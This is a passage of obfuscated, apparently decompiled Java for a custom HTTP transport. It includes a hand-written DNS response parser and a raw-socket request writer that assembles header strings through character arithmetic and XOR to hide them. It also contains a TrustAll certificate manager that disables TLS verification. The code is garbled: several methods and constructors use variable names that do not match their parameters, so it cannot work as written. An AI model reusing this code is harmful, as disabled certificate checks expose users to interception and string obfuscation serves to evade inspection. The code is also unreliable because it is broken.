         var21.append(var22.toString());
         StringBuilder var24 = new StringBuilder();
         var24.append((char)('\ua076' + 24555));
         var24.append((char)('\u8968' + 30474));
         var24.append((char)(24631 + '\ua02e'));
         var24.append((char)('\u9a15' + 26136));
         var24.append((char)('\ua079' + 24555));
         var24.append((char)('\u8964' + 30474));
         var24.append((char)(24645 + '\ua02e'));
         var24.append((char)('\u9a16' + 26136));
         var24.append((char)('\ua078' + 24555));
         var24.append((char)('\u8965' + 30474));
         var24.append((char)(24639 + '\ua02e'));
         var24.append((char)('\u99f5' + 26136));
         var24.append((char)('\ua01f' + 24555));
         var21.append(var24.toString());
         itemRaw.append(var21.toString());
         StringBuilder var26 = new StringBuilder();
         StringBuilder var27 = new StringBuilder();
         var27.append((char)(29693 - 29628));
         var27.append((char)('\ucfb5' - '\ucf52'));
         var27.append((char)('\ubdbb' - '\ubd58'));
         var27.append((char)(18257 - 18156));
         var27.append((char)('\ufe51' - '\ufde1'));
         var27.append((char)(7029 - 6913));
         var26.append(var27.toString());
         char[] var29 = new char[]{
            (char)(8176 + '\ue04a'),
            (char)(27479 + '\u94c9'),
            (char)(29385 + '\u8d98'),
            (char)(11227 + '\ud495'),
            (char)('\u83a0' + 31952),
            (char)(6074 + '\ue8b2'),
            (char)(32329 + '\u8220'),
            (char)(8217 + '\ue04a'),
            (char)(27544 + '\u94c9'),
            (char)(29404 + '\u8d98'),
            (char)(11220 + '\ud495'),
            (char)('\u839f' + 31952),
            (char)(6076 + '\ue8b2'),
            (char)(32271 + '\u8220'),
            (char)(8218 + '\ue04a'),
            (char)(27557 + '\u94c9')
         };
         var26.append(new String(var29));
         StringBuilder var31 = new StringBuilder();
         var31.append((char)(9497 ^ 9578));
         var31.append((char)('\ucd18' ^ '\ucd35'));
         var31.append((char)(16191 ^ 16210));
         var31.append((char)('\ua46b' ^ '\ua40e'));
         var31.append((char)(30238 ^ 30317));
         var31.append((char)(12241 ^ 12194));
         var31.append((char)('\ud983' ^ '\ud9e2'));
         var31.append((char)('\u94e0' ^ '\u9487'));
         var31.append((char)('\ucb0a' ^ '\ucb6f'));
         var31.append((char)('\uf755' ^ '\uf758'));
         var31.append((char)('\ua64e' ^ '\ua644'));
         var26.append(var31.toString());
         itemRaw.append(var26.toString());
         char[] var33 = new char[]{
            (char)('\ubb34' - '\ubaf1'),
            (char)(12501 - 12390),
            (char)(15961 - 15851),
            (char)('\uc647' - '\uc5d9'),
            (char)('\ufb1d' - '\ufab8'),
            (char)('\uc370' - '\uc30d'),
            (char)('\ua7a7' - '\ua733'),
            (char)('\ub40e' - '\ub3a5'),
            (char)(16868 - 16757),
            (char)('\u9b71' - '\u9b03'),
            (char)('\ucd50' - '\ucd16'),
            (char)('\ubb11' - '\ubaf1'),
            (char)(12489 - 12390),
            (char)(15959 - 15851),
            (char)('\uc648' - '\uc5d9'),
            (char)('\ufb2b' - '\ufab8'),
            (char)('\uc372' - '\uc30d'),
            (char)('\ua740' - '\ua733'),
            (char)('\ub3af' - '\ub3a5')
         };
         itemRaw.append(new String(var33));
         int var34 = 502206664;
         if (var34 - 502206664 == 0) {
            var34 = 2040284577;
            var34 <<= 19;
            var34 >>>= 27;
         }

         itemRaw.append("\r\n");
         oJy6hjTT.write(itemRaw.toString().getBytes(StandardCharsets.ISO_8859_1));
         oJy6hjTT.flush();
         HttpTransport.Response nzyqrYabrtgXrdnc = copyUzzcstd(r2zXx);
         var9 = nzyqrYabrtgXrdnc.body;
      } finally {
         pddvik_sk_wnaw_hxgmyo.close();
      }

      return var9;
   }

   private static String fqqnxm(byte[] response) {
      if (HxlMuXhEB != null && HxlMuXhEB.length >= 12) {
         ByteBuffer bkxUdH9l_0vD = ByteBuffer.wrap(HxlMuXhEB);
         bkxUdH9l_0vD.getShort();
         short muj_qsqrl_xo = bkxUdH9l_0vD.getShort();
         if ((muj_qsqrl_xo & '\u8000') == 0) {
            return null;
         } else {
            int optsacc = muj_qsqrl_xo & 15;
            if (optsacc != 0) {
               return null;
            } else {
               int hDBZ_TsHT_drue_xRSX = bkxUdH9l_0vD.getShort() & '\uffff';
               int sBOg_upsM_kETP_NLAQ = bkxUdH9l_0vD.getShort() & '\uffff';
               bkxUdH9l_0vD.getShort();
               bkxUdH9l_0vD.getShort();

               for (int bfvkMorayPvlgVwvi = 0; bfvkMorayPvlgVwvi < hDBZ_TsHT_drue_xRSX; bfvkMorayPvlgVwvi++) {
                  yfkny3(bkxUdH9l_0vD);
                  bkxUdH9l_0vD.getShort();
                  bkxUdH9l_0vD.getShort();
               }

               for (int gyCq5_n = 0; gyCq5_n < sBOg_upsM_kETP_NLAQ; gyCq5_n++) {
                  yfkny3(bkxUdH9l_0vD);
                  int le_xihkhw_fghox = bkxUdH9l_0vD.getShort() & '\uffff';
                  bkxUdH9l_0vD.getShort();
                  bkxUdH9l_0vD.getInt();
                  int vPtr = bkxUdH9l_0vD.getShort() & '\uffff';
                  if (le_xihkhw_fghox == 1 && vPtr == 4) {
                     byte[] hk_hcn_lfb_add = new byte[4];
                     bkxUdH9l_0vD.get(hk_hcn_lfb_add);
                     int var10000 = hk_hcn_lfb_add[0] & 255;
                     int var10001 = hk_hcn_lfb_add[1] & 255;
                     int var10002 = hk_hcn_lfb_add[2] & 255;
                     int var13 = hk_hcn_lfb_add[3] & 255;
                     int var12 = var10002;
                     int var11 = var10001;
                     int var10 = var10000;
                     return var10 + "." + var11 + "." + var12 + "." + var13;
                  }

                  bkxUdH9l_0vD.position(bkxUdH9l_0vD.position() + vPtr);
               }

               return null;
            }
         }
      } else {
         return null;
      }
   }

   private static void yfkny3(ByteBuffer buf) {
      while (temp1.hasRemaining()) {
         int glvmzFkyko = temp1.get() & 255;
         if (glvmzFkyko != 0) {
            if ((glvmzFkyko & 192) != 192) {
               temp1.position(temp1.position() + glvmzFkyko);
               continue;
            } else {
               temp1.get();
            }
         }
         break;
      }
   }

   static {
      try {
         SSLContext yMax = SSLContext.getInstance("TLS");
         yMax.init(null, new TrustManager[]{new HttpTransport.TrustAll()}, new SecureRandom());
         aaVnhcimIdhf = yMax.getSocketFactory();
      } catch (Exception var1) {
         aaVnhcimIdhf = (SSLSocketFactory)SSLSocketFactory.getDefault();
      }
   }

   private static class CacheEntry {
      final String ip;
      final long expiresAt;

      CacheEntry(String ip, long expiresAt) {
         gkuaJzmxmVsosd.ip = oyrWxvtnoZveAyg;
         gkuaJzmxmVsosd.expiresAt = vfbkQmxtpe;
      }

      boolean isExpired() {
         return System.currentTimeMillis() > _Nde.expiresAt;
      }
   }

   public static class Response {
      public final int statusCode;
      public final String statusLine;
      public final Map<String, String> headers;
      public final byte[] body;

      Response(int statusCode, String statusLine, Map<String, String> headers, byte[] body) {
         configAvg.statusCode = posAcc;
         configAvg.statusLine = lruFxuewRfejOqdxqw;
         configAvg.headers = b5o_AE8_vVz;
         configAvg.body = configTmp;
      }

      public String bodyString() {
         return new String(mRef.body, StandardCharsets.UTF_8);
      }

      public String header(String name) {
         return bbejolBpzbb.headers.get(k3.toLowerCase());
      }
   }

   private static class TrustAll implements X509TrustManager {
      @Override
      public void checkClientTrusted(X509Certificate[] chain, String authType) {
      }

      @Override
      public void checkServerTrusted(X509Certificate[] chain, String authType) {
      }

      @Override
      public X509Certificate[] getAcceptedIssuers() {
         return new X509Certificate[0];
      }
   }
}
